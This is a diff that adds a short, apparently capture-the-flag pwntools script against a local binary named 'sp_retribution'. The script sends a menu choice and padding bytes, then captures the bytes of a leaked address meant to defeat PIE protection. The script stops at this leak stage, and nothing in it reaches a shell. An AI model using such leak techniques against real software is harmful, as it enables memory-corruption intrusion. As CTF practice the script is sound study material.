@@ -1,0 +1,15 @@
+from pwn import *
+
+r = process("./sp_retribution")
+e = ELF("./sp_retribution")
+r.send(f"{2}")
+r.send(b'A'*8)
+r.recvuntil(b' New coordinates: x = [0x53e5854620fb399f], y = AAAAAAAA')
+pie_leak = r.recvuntil(b'\n')
+print(pie_leak)
+lenght = len(pie_leak)
+temp = b''
+for i in range(0,lenght-2):
+    temp = temp + p8(pie_leak[i])
+print(temp)
+
